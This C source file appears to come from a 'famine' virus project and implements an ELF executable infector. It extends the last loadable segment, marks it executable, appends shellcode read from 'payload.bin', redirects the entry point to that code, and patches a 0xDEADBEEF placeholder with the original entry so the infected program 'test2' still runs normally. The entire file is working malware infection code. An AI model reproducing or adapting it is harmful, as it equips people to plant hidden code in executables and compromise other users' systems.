#include "famine.h"
#include <stdlib.h>
#include <elf.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <unistd.h>

Elf64_Phdr *last_phdr(char *data)
{
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)(data);
    Elf64_Phdr *phdrs = (Elf64_Phdr *)(data + ehdr->e_phoff);

    
    Elf64_Phdr *target = NULL;
    
    int i = 0;
    while(i < ehdr->e_phnum)
    {
        if (phdrs[i].p_type == PT_LOAD)
            target = &phdrs[i];
        i++;
    }
    return target;
}


uint64_t payload(char *data, size_t data_size, char *code, size_t code_size)
{
    Elf64_Phdr *target = last_phdr(data);
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)data;
    
    uint64_t orig_filesz = target->p_filesz;
    uint64_t gap = data_size - (target->p_offset + orig_filesz);
    
    Elf64_Addr new_entry = target->p_vaddr + orig_filesz + gap;
    
    target->p_filesz += gap + code_size;
    target->p_memsz  += gap + code_size;
    target->p_flags  |= PF_X;
    
    uint64_t old_entry = ehdr->e_entry;
    ehdr->e_entry = new_entry;
    
    memmove(data + data_size, code, code_size);
    
    return old_entry;
}




int main(void)
{
    int fd = open("example", O_RDONLY);
    int fd2 = open("payload.bin", O_RDONLY);

    struct stat st;
    struct stat st2;

    fstat(fd, &st);
    if (fstat(fd2, &st2) < 0)
        perror("error\n");


    char *data = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    char *code = mmap(NULL, st2.st_size, PROT_READ, MAP_PRIVATE, fd2, 0);
    close(fd);
    close(fd2);

    char *new = malloc(st.st_size + st2.st_size + 1);
    
    memcpy(new, data, st.st_size);

    uint64_t entry = payload(new, st.st_size, code, st2.st_size);
    uint64_t *patch = memmem(new, st.st_size + st2.st_size, "\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE", 8);
    if (patch)
        *patch = entry;

    int out = open("test2", O_WRONLY | O_CREAT | O_TRUNC, 0755);
write(out, new, st.st_size + st2.st_size);
close(out);
    
    return 0;
}
